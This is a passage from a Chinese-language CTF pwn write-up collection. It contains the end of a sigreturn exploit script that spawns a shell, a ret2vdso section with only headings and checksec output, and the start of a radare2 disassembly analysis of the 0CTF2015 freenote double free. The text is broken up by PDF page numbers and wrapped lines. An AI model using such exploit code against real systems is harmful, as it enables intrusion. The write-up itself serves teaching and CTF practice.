payload_1 += sigreturn
payload_1 += str(frame_1)
io.sendline(payload_1)
io.recvuntil("> ")
io.sendline("3")
payload_2 = "/bin/sh\x00"
payload_2 += sigreturn
payload_2 += str(frame_2)
io.sendline(payload_2)
io.interactive()
参考资料
962
6.1.5 pwn GreHackCTF2017 beerfighter
https://ctftime.org/task/4939
963
6.1.6 pwn DefconCTF2015 fuckup
6.1.6 pwn DefconCTF2015 fuckup
ret2vdso 原理
题目解析
漏洞利用
参考资料
下载文件
ret2vdso 原理
在你使用 ldd 命令时，通常会显示出 vDSO，如下：
$ ldd /usr/bin/ls
linux-vdso.so.1 (0x00007ffff7ffa000)
libcap.so.2 => /usr/lib/libcap.so.2 (0x00007ffff79b2000)
libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff75fa000)
/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-6
4.so.2 (0x00007ffff7dd8000)
32 位程序则会显示 linux-gate.so.1 ，都是一个意思。
题目解析
$ file fuckup
fuckup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)
, statically linked, stripped
$ checksec -f fuckup
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
No RELRO No canary found NX enabled No PIE
No RPATH No RUNPATH No 0 0 fuckup
漏洞利用
964
6.1.6 pwn DefconCTF2015 fuckup
参考资料
man vdso
Return to VDSO using ELF Auxiliary Vectors
965
6.1.7 pwn 0CTF2015 freenote
6.1.7 pwn 0CTF2015 freenote
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file freenote
freenote: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), d
ynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for
GNU/Linux 2.6.24, BuildID[sha1]=dd259bb085b3a4aeb393ec5ef4f09e31
2555a64d, stripped
$ checksec -f freenote
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 2 freenot
e
$ strings libc-2.19.so | grep "GNU C"
GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.6) stable release ver
sion 2.19, by Roland McGrath et al.
Compiled by GNU CC version 4.8.2.
因为没有 PIE，即使本机开启 ASLR 也没有关系。
玩一下，它有 List、New、Edit、Delete 四个功能：
$ ./freenote
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
966
6.1.7 pwn 0CTF2015 freenote
4. Delete Note
5. Exit
====================
Your choice: 2
Length of new note: 5
Enter your note: AAAA
Done.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 1
0. AAAA
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 3
Note number: 0
Length of note: 10
Enter your note: BBBBBBBBB
Done.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 1
0. BBBBBBBBB
== 0ops Free Note ==
967
6.1.7 pwn 0CTF2015 freenote
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 4
Note number: 0
Done.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 1
You need to create some new notes first.
== 0ops Free Note ==
1. List Note
2. New Note
3. Edit Note
4. Delete Note
5. Exit
====================
Your choice: 5
Bye
然后漏洞似乎也很明显，如果我们两次 Delete 同一个笔记，则触发 double free：
*** Error in `./freenote': double free or corruption (!prev): 0x
0000000000672830 ***
Aborted
在 Ubuntu 14.04 上把程序跑起来：
$ socat tcp4-listen:10001,reuseaddr,fork exec:"env LD_PRELOAD=./
libc-2.19.so ./freenote" &
968
6.1.7 pwn 0CTF2015 freenote
题目解析
我们先来看一下 main 函数：
[0x00400770]> pdf @ main
/ (fcn) main 60
| main ();
| ; var int local_4h @ rbp-0x4
| ; DATA XREF from 0x0040078d (entry0)
| 0x00401087 55 push rbp
| 0x00401088 4889e5 mov rbp, rsp
| 0x0040108b 4883ec10 sub rsp, 0x10
| 0x0040108f b800000000 mov eax, 0
| 0x00401094 e864f9ffff call sub.setvbuf_9fd
; int setvbuf(FILE*stream, char*buf, int mode, size_t siz
e)
| 0x00401099 b800000000 mov eax, 0
| 0x0040109e e8a6f9ffff call sub.malloc_a49
; void *malloc(size_t size)
| ; JMP XREF from 0x0040110f (main + 136)
| 0x004010a3 b800000000 mov eax, 0
| 0x004010a8 e8ebf8ffff call sub.0ops_Free_No
te_998
| 0x004010ad 8945fc mov dword [local_4h],
eax
| 0x004010b0 837dfc05 cmp dword [local_4h],
5 ; [0x5:4]=-1 ; 5
| ,= px 48 @ 0x4012f8
- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789A
BCDEF
0x004012f8 0411 4000 0000 0000 c310 4000 0000 0000 ..@.......@
.....
0x00401308 cf10 4000 0000 0000 db10 4000 0000 0000 ..@.......@
.....
0x00401318 e710 4000 0000 0000 f310 4000 0000 0000 ..@.......@
.....
970
6.1.7 pwn 0CTF2015 freenote
[0x00400770]> pd 22 @ 0x4010c3
: 0x004010c3 b800000000 mov eax, 0
: 0x004010c8 e847faffff call sub.You_need_to_
create_some_new_notes_first._b14
,== 0x00401111 c9 leave
0x00401112 c3 ret
所以四个功能对应的函数如下：
971
6.1.7 pwn 0CTF2015 freenote
List： sub.You_need_to_create_some_new_notes_first._b14
New： sub.Length_of_new_note:_bc2
Edit： call sub.Note_number:_d87
Delete： call sub.No_notes_yet._f7d
函数 sub.malloc_a49 如下：
[0x00400770]> pdf @ sub.malloc_a49
/ (fcn) sub.malloc_a49 203
| sub.malloc_a49 ();
| ; var int local_4h @ rbp-0x4
| ; CALL XREF from 0x0040109e (main)
| 0x00400a49 55 push rbp
| 0x00400a4a 4889e5 mov rbp, rsp
| 0x00400a4d 4883ec10 sub rsp, 0x10
| 0x00400a51 bf10180000 mov edi, 0x1810
| 0x00400a56 e8d5fcffff call sym.imp.malloc
; void *malloc(size_t size)
| 0x00400a5b 488905461620. mov qword [0x006020a8
], rax ; [0x6020a8:8]=0
| 0x00400a62 488b053f1620. mov rax, qword [0x006
020a8] ; [0x6020a8:8]=0
| 0x00400a69 48c700000100. mov qword [rax], 0x10
0 ; [0x100:8]=-1 ; 256 ; Notes 结构体成员 max
| 0x00400a70 488b05311620. mov rax, qword [0x006
020a8] ; [0x6020a8:8]=0
| 0x00400a77 48c740080000. mov qword [rax + 8],
0 ; Notes 结构体成员 length
| 0x00400a7f c745fc000000. mov dword [local_4h],
0 ; [local_4h] 是 Note 的序号
| ,= 0x00400a88 488b0d191620. mov rcx, qword [0x006
020a8] ; [0x6020a8:8]=0 ; Notes 结构体的地址
| :| 0x00400a8f 8b45fc mov eax, dword [local
_4h]
| :| 0x00400a92 4863d0 movsxd rdx, eax
| :| 0x00400a95 4889d0 mov rax, rdx
| :| 0x00400a98 4801c0 add rax, rax
; '#'
972
6.1.7 pwn 0CTF2015 freenote
| :| 0x00400a9b 4801d0 add rax, rdx
; '('
| :| 0x00400a9e 48c1e003 shl rax, 3
; 序号 *24
| :| 0x00400aa2 4801c8 add rax, rcx
; '&'
| :| 0x00400aa5 4883c010 add rax, 0x10
; 序号对应的 Note 地址
| :| 0x00400aa9 48c700000000. mov qword [rax], 0